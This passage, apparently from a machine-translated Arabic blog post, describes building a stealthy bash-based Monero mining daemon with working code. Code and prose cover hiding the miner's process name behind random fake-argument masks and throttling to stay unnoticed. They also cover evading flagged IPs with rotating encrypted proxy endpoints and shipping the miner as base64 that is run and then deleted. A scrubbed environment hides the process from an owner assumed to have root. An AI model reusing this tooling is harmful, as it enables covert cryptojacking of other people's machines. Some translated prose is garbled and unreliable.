            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>العمليات المشتركة متاحة منذ bash<code>v4</code> ، فهي مثل الوظائف إلا أن لها اسمًا وأوصاف ملفات خاصة بها.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>نحن نكتب عفريتًا ، وهي عملية طويلة الأمد ، ونستخدم العديد من واصفات الملفات ، ونريد حقًا إجراء بعض عمليات التنظيف لتجنب تكبدها<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> يليميتس</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>تعتمد هذه الوظيفة على<a href=https://ipinfo.io/> ipinfo</a> لتحديد منطقة العامل ، مما يسمح بضبط بعض المنطق المعتمد على المنطقة ،<a href=\assets/posts/geoip.json> geoip.json</a> تقوم بتجميع البلدان في مناطق ، نظرًا لأننا نريد منطقة المستوى الأعلى ، ولسنا مهتمين بالبلد المحدد.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>يدعم Bash اتصالات tcp ، من خلال التجريد<code>/dev/tcp</code> (أيضًا لـ udp ، ولكن يبدو أن معظمها يتم تعطيله عادةً في وقت الإنشاء ، لذا لا يمكنك الاعتماد عليه). هذه الملفات هي شيء bash ، فهي ليست جزءًا من linux<code>/dev</code> شجرة.<p>تجدر الإشارة أيضًا إلى نظام قفل للتعامل مع التزامن بين وظائف bash. للسماح بوظائف متعددة بالعمل مع الأقفال ، يحتاجون جميعًا إلى مشاركة واصف ملف ، لذلك<code>locker</code> وهي أيضًا وظيفة ، يجب أن تبدأ قبل الوظائف الأخرى التي ترغب في استخدام القفل. الخزانة تقرأ ببساطة<code>stdin</code> في انتظار طلبات القفل ، الرد على<code>stdout</code> اعتمادًا على الحالة المنطقية الحالية المخزنة في متغير. لا أضمن أن هذا النهج خالٍ من العرق ، ولكن يبدو أنه يعمل بشكل لائق ، من ناحية أخرى ، وجدت أن واصفات الملفات ليست موثوقة للغاية ، حيث أظن أن هناك بعض المخازن المؤقتة التي لا يتم مسحها في مكان ما أسفل<em> أنابيب</em> وفي النهاية تصل إلى طريق مسدود (مما يعني أنه لا يمكنك الاعتماد على الخزانة التي تمنحك إجابة طوال الوقت).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>نظف القمامة ... تنتهي برامج bash المعقدة باستخدام العديد من المتغيرات ، وإذا أساءت استخدام الفضاء العالمي ، فستتفاقم. إذا كنت تقوم بإنشاء وظائف شيل ، فإنها ترث كل البيئة (التي تتكرر بشكل فعال ، وليست مشتركة) ، يمكنك أن ينتهي بك الأمر بسرعة مع تناول الطعام باش<code>100M</code> من الذاكرة ، ليس لطيفًا. كما أننا نريد حقًا أن نكون غير بارزين. في سيناريو الانتشار لدينا ، الخصم<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> من المحتمل أن يكون لديه حق الوصول إلى الجذر ومعلومات كاملة حول عملياتنا<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> ، وأنت تعرف ... كل عملية تحتوي على معلومات حول الأمر الكامل الذي بدأها ، ومتغيرات البيئة المصدرة.<h2 id=configuration><a class=header-anchor href=#configuration> إعدادات</a></h2><p>بمجرد أن نحصل على بيئتنا وأدواتنا ، يتعين علينا ضبط عامل التعدين الخاص بنا على الجهاز الذي يعمل عليه ، وخطوات التكوين في رمز زائف:<ul><li><p>اسم العملية لعامل المنجم<li><p>معلومات المضيف (ذاكرة الوصول العشوائي / النوى / مخابئ /<code>ENV_VARS</code>)<li><p>إصدار التكوين<li><p><code>worker_id</code> للمُعدِّن (من IP والمضيف)<li><p>IP / منفذ للاتصال</ul><p>اختيار اسم للعملية مطلوب<em> إخفاء</em> حقيقة أننا ندير عامل منجم ، لكننا لا نعيد تسمية نظامنا الثنائي فحسب ، بل لدينا قائمة<strong> أقنعة</strong> للمرشحين المحتملين (ملف نصي عادي حيث يكون كل سطر قناعًا):<ul><li><p>اختر قناعًا عشوائيًا<li><p>قم بتبديل عناصر ذيل السلسلة (جميعها باستثناء الأولى) للحصول على أمر عملية متنوع. الآن لدينا سلسلة تشبه<code>cmd --arg2 --arg1 --arg3</code> . هذا هو قناع عامل التعدين لدينا ، نقوم بتشغيل الثنائي<em> بدون</em> الحجج ، ولكن يبدو أننا بدأنا الأمر<code>cmd</code> مع الحجج<code>--arg1 --arg2 --arg3</code> . يُسمح بالمسافات والشرطات في أسماء الملفات ، لذلك لا بأس من تشغيل ثنائي باسم هذا ، لا يبدو أن لينكس يميز بين الملف القابل للتنفيذ والوسيطات عند تخزين أوامر العملية.<p>يتم تحميل تكوين عامل التعدين تلقائيًا من<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> معدل التجزئة</a></h3><p>مع مرور الوقت ، حصل عامل المنجم في المنبع على الكثير<strong> ضبط تلقائي</strong> الميزات ، لذلك جعلت جزءًا من نصوصي زائدة عن الحاجة ، ولكن الفرق بين المنبع والمصب هنا هو أن الهدف الرئيسي هو تعظيم<em> أداء</em> ، بينما هدفنا هو تحقيق أقصى قدر<em> الكفاءة والتعتيم</em> ، لا نريد تجاوز النظام ، نريد أن نتعطل قليلاً دون انقطاع الخدمة.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>لهذا ، نحن بحاجة إلى فهم أكثر دقة للبيئة ، و<code>l2/l3</code> بنية ذاكرة التخزين المؤقت للمعالج وذاكرة الوصول العشوائي والنوى والمعالج الحالي<em> معدل</em> الحمل ووحدة المعالجة المركزية<em> الاستخدام</em>. حاولت بناء<a href=https://en.wikipedia.org/wiki/Finite-state_machine> آلة الدولة</a> في bash سيبدأ من الحد الأدنى ويجرب تكوينات مختلفة ببطء يستقر على المتوسط ​​الأفضل. كانت<strong> تسربت</strong> مضيعة للجهود المتناثرة معها<a href=https://en.wikipedia.org/wiki/Technical_debt> الدين الفني</a> التي أفلست بسرعة كبيرة وتم التخلص منها في الغالب ، مع بقاء البقايا في قاعدة الرموز.<p>تكسير كل هذا الضبط التلقائي الجامبو ، لقد جعلنا عامل المنجم ينام اعتمادًا على استخدام / حمل المضيف ، وهذا يتطلب تعديلات عامل المنجم على<code>sleep</code> بين خيوط الغلة ، وبعض الإصلاحات للرقابة على التكوين<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> ، مما سيسمح لنا بإعادة تحميل كمية النوم في وقت التشغيل. المنطق أكثر بساطة ويبدو كالتالي:<ul><li><p>إذا كان الاستخدام أعلى / أقل من $ TARGET_USAGE (± هامش الخطأ) قم بزيادة / تقليل السكون<li><p>إذا كان متوسط ​​الحمل في الداخل<code>1m</code> أعلى / أقل من $ TARGET_LOAD الإيقاف المؤقت / استئناف التعدين</ul><h3 id=connection><a class=header-anchor href=#connection> اتصال</a></h3><p>في تقرير bash الخاص بنا ، أظهرنا أدوات مساعدة للاتصال. لماذا نحتاج هؤلاء؟ لأننا بحاجة إلى التنوع. ببساطة ، لن يستمر ترميز نقطة نهاية في التكوين طويلاً ، عندما يبدو شيء مريبًا ، وله نشاط على الشبكة ، يتم وضع علامة على عناوين IP.<p>في البداية جربنا طريقتين:<ul><li><p>استخدام<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> بروكسيكينس</a> لزيادة تحميل مكالمات شبكة عامل المنجم ، لكن الأمر يتطلب أن يتم بناء عامل المنجم بمكتبات ديناميكية ، وكان عليك شحنهم مع الحمولة ، لذلك كان ذلك غير عملي.<li><p>تشغيل<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> نفق أمامي</a> جنبًا إلى جنب مع المُعدِّن: كان لهذا الكثير من تكاليف التكوين ، حيث كنا الآن بصدد تكوين عمليتين في كل عملية نشر ، مما أدى إلى مزيد من الأخطاء.</ul><p>في النهاية ، قررنا شحن قائمة من نقاط النهاية ، مخزنة في متغيرات bash ، واختيار واحدة بشكل عشوائي. تم تشفير الاتصالات بالطبع. ما هي نقاط النهاية هذه؟ وكلاء الشحن إلى الوكيل الذي سيتولى مهام عمال المناجم.<p>لماذا نحتاج إلى ملف<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> وكيل التعدين</a> ؟ لم أتجاوز حقًا 100 اتصال متزامن ، لذا لم يكن الوكيل ضروريًا حقًا لتحميل الشبكة ، ولكنه كان مناسبًا للتفاوض على خوارزمية التجزئة ، ولتوفير أهداف صعوبة مختلفة لعمال المناجم المختلفين ، لمنع عمال المناجم من العمل على<strong> صعوبة</strong> الأهداف التي من شأنها أن تستغرق وقتًا طويلاً لإكمالها وتتجنب خطر إضاعة الحساب في وظائف غير مكتملة.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> تطلب برنامج التجمع أيضًا بعض التعديلات حيث كان من دواعي سرور الإعلان أنه وكيل لطلبات http العادية ...<em> كان لا بد من انقضاء المهلة المحددة</em> ، وشوكة أضافت تحكمًا في الوصول لذلك اعتمدنا تعديلاتنا على ذلك.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> تحرير json</a></h3><p>تطبيق التعديلات على ملف json باستخدام bash فقط حصلنا عليه مع بعض استبدال var ، وبعض regex. في البداية كنا نعتمد على<code>envsubst</code> ثنائي لتطبيق المتغيرات ، ثم ذهبنا باش كامل<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> بهذا المنطق:<ul><li><p>قراءة نموذج التكوين<li><p>استبدل جميع علامات الاقتباس بسلسلة مقصورة على فئة معينة (مثل<code>_#_#</code>)<li><p><code>eval</code> القالب<li><p>استبدل كل الأحداث الباطنية بعلامات اقتباس</ul><p>بصرف النظر عن تجنب العمليات الفرعية ، هناك ميزة أخرى وهي أننا نحصل على إمكانات bash كاملة في قوالبنا. للقراءة والكتابة بدون قوالب ، علينا الاعتماد على إمكانيات bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>يسمح لنا هذا فقط بتعديل الأسطر الفردية ، بالنسبة لمدخلات الأسطر المتعددة ، فإنه يعتبر السطر الأول فقط .. ولكنه جيد بما يكفي لحالة الاستخدام الخاصة بنا.<h2 id=runtime><a class=header-anchor href=#runtime> مدة العرض</a></h2><p>كيف يبدو وقت التشغيل لدينا؟ لدينا عملية bash الرئيسية التي تنفذ الحلقة الرئيسية ، ثم عملية التعدين الفرعية ، والعملية الفرعية لمراقبة وحدة المعالجة المركزية ، والخزانة والموالف. هذا ما يقرب من حفنة.<p>أولاً ، نريد التأكد من أنه إذا حدث خطأ ما ، فلن نترك أي فوضى ، وهذا يعني أننا نستخدم مصيدة باش لإجراء عمليات التنظيف عند الإنهاء<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> يزعج الفخ لمنع العودية. المصيدة تقتل جميع الوظائف وتزيل بيئة العمل.<p>حان الوقت لبدء عامل التعدين ، والذي يتم تخزينه كمتغير bash في ترميز base64. نقوم بتفريغها على نظام الملفات ، ثم نقوم بتفريغ التكوين ، وتنفيذ عامل المنجم ، وإزالة كل من عامل التنقيب والتكوين. في نظام التشغيل Linux ، يمكنك إزالة الملف التنفيذي لعملية جارية (غير مسموح بهذا على الويندوز).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> عندما يكون عامل التعدين قيد التشغيل ، يوجد في نظام الملفات ملف<code>.. /</code> الدليل مع ملف<code>b64</code> رابط فيه.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>هناك غرابة جنونية مصادفة مع bash أثناء تشفير عامل المنجم وهي تخصيص متغير بقشرة فرعية بعلامات اقتباس<code>myvar="$(something)"</code> يؤدي إلى زيادة دائمة في استخدام الذاكرة ، وكان من الصعب تصحيح هذا الأمر ولم يعثر حقًا على سبب التصرف بهذا الشكل ، على أي حال يجب عدم اقتباس المهمة. يتم فك التشفير بدلاً من ذلك باستخدام<em> الحلقات</em> وهو عبارة عن عملية تجريد للملفات المؤقتة ، يتم تفريغ المتغير في ملف يتم إعادة توجيهه بعد ذلك إلى العملية.<p>حلقة تشغيل طويلة لعمال المناجم:<ul><li><p>احيانا صحيح<ul><li><p>توقف عامل المنجم<li><p>إزالة التكوين<li><p>بدء عامل منجم<li><p>احيانا صحيح<ul><li><p>بدء الخفي<ul><li><p>أثناء تشغيل عامل منجم<ul><li><p>قراءة الإخراج من عامل منجم<li><p>اختر عمل عامل منجم على أساس خط الإخراج</ul></ul><li><p>إذا كان عامل المنجم لا يعمل: استراحة</ul><li><p>نايم</ul></ul><p>تتم مطابقة سطر الإخراج مع بعض regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>يعالج البرنامج الخفي الحالات حيث<ul><li><p>الاتصال بنقطة النهاية يعطي أخطاء (اختر نقطة نهاية عشوائية جديدة)<li><p>تتغير خوارزمية التجزئة (اضبط وقت السكون والتكوينات المخصصة)<li><p>مشاكل عامل المنجم (إعادة تشغيل عامل المنجم).</ul><p>لفترة من الوقت كان هناك دعم للوحة معلومات القيادة والتحكم ، والتي سمحت بتشغيل إعادة التشغيل اليدوي ، ولكن نظرًا لأن استخدامها كان ضئيلًا ، تم تجاهلها ، وتم استبدال نقاط النهاية الخاصة بها باتصال مجمع بديل ، كما كانت عملية إعادة التشغيل غير مستقرة ومعقدة. .. مثال آخر للديون التقنية. ومع ذلك ، فقد سمح بإعادة إحضار حمولة محدثة وإعادة إعداد جميع التكوينات أثناء الطيران ، والتي كانت رائعة جدًا ، الترامبولين النهائي.<h2 id=debugging><a class=header-anchor href=#debugging> تصحيح</a></h2><p>هناك ثلاث مرافق 